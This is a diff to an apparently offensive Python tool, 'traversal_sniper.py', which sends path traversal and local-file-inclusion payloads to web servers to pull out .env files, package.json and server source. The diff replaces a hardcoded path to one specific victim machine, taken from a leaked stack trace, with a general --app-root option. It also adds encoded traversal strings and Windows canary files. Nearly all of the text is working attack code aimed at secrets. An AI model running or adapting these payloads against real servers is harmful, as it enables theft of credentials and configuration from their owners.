@@ -1,16 +1,17 @@
 """
-traversal_sniper.py — Targeted Path Traversal Key Extraction
-Using leaked stack trace path (C:\\Users\\WhitePC\\Rooms\\Coderoom\\CLI\\StudioCLI\\web\\)
-to craft precise traversal payloads targeting .env and config files.
+traversal_sniper.py — Path Traversal / LFI probe for .env and config files.
+
+Crafts traversal payloads across common static roots and file-serving endpoint
+patterns. When a target leaks its absolute app root in a stack trace, feed it in
+with --app-root to add precise absolute-path payloads for that specific depth.
 """
 import sys, os, argparse, urllib.request, urllib.error, urllib.parse, json, re
 
 sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
 from vibe_core import VibeTool
 
-# Known from stack trace: app root = StudioCLI/web/
-# If static files are served from web/public or web/dist, traversal depth varies.
-# Try all realistic depths.
+# Static files are often served from web/public or web/dist, so traversal depth
+# varies. We try all realistic depths.
 
 TARGETS = [".env", ".env.local", ".env.production", ".env.development",
            "package.json", "server.js", "index.js", "app.js", ".env.example"]
@@ -74,14 +75,32 @@ PRECISE_TRAVERSALS = [
     "/css/../.env",
 ]
 
-# Windows-specific paths (target is Windows: C:\Users\WhitePC\...)
+# Windows canaries + deep relative climbs. Standard well-known files confirm a
+# traversal without needing the target's absolute path; --app-root adds precise
+# absolute payloads when a stack trace has leaked the real root.
 WINDOWS_PATHS = [
-    "/C:/Users/WhitePC/Rooms/Coderoom/CLI/StudioCLI/web/.env",
-    "/%43%3a%2fUsers%2fWhitePC%2fRooms%2fCoderoom%2fCLI%2fStudioCLI%2fweb%2f.env",
+    "/../../../../../../windows/win.ini",
+    "/..%5C..%5C..%5C..%5C..%5Cwindows%5Cwin.ini",
+    "/../../../../../../windows/system32/drivers/etc/hosts",
     "/..%2F..%2F..%2F..%2F..%2F.env",
     "/..\\..\\..\\.env",
     "/..%5C..%5C..%5C.env",
 ]
+
+
+def _absolute_root_payloads(app_root):
+    """Build precise absolute-path payloads from an operator-supplied app root
+    (e.g. one leaked in a stack trace). Empty unless --app-root is given."""
+    root = (app_root or "").strip().rstrip("/\\")
+    if not root:
+        return []
+    sep = "\\" if (":" in root[:3] or "\\" in root) else "/"
+    payloads = []
+    for target in (".env", ".env.local", "server.js", "package.json"):
+        raw = f"/{root}{sep}{target}"
+        payloads.append(raw)
+        payloads.append("/" + urllib.parse.quote(f"{root}{sep}{target}", safe=""))
+    return payloads
 
 # Parameter injection for static file endpoints
 PARAM_TRAVERSALS = [
@@ -202,7 +221,7 @@ class TraversalSniper(VibeTool):
             if s not in (404, 405, 0):
                 self.log(f"  [{s}] {p}: {body[:150]}", "warn" if s == 200 else "info")
 
-    def run(self, url):
+    def run(self, url, app_root=""):
         self.banner()
         base = url.rstrip("/")
 
@@ -212,6 +231,12 @@ class TraversalSniper(VibeTool):
         self.vector_static_roots(base)
         self.vector_windows(base)
         self.vector_params(base)
+
+        absolute = _absolute_root_payloads(app_root)
+        if absolute:
+            self.log("=== ABSOLUTE: Operator-supplied app-root payloads ===")
+            for path in absolute:
+                self._try_path(base, path)
 
         self.log("================================")
         if self.hits:
@@ -226,5 +251,8 @@ class TraversalSniper(VibeTool):
 if __name__ == "__main__":
     parser = argparse.ArgumentParser()
     parser.add_argument("--url", required=True)
+    parser.add_argument("--app-root", default="",
+                        help="Absolute app root leaked in a stack trace, to build precise payloads")
+    parser.add_argument("-v", "--version", action="version", version="Traversal Sniper 1.0.0")
     args = parser.parse_args()
-    TraversalSniper().run(args.url)
+    TraversalSniper().run(args.url, app_root=args.app_root)
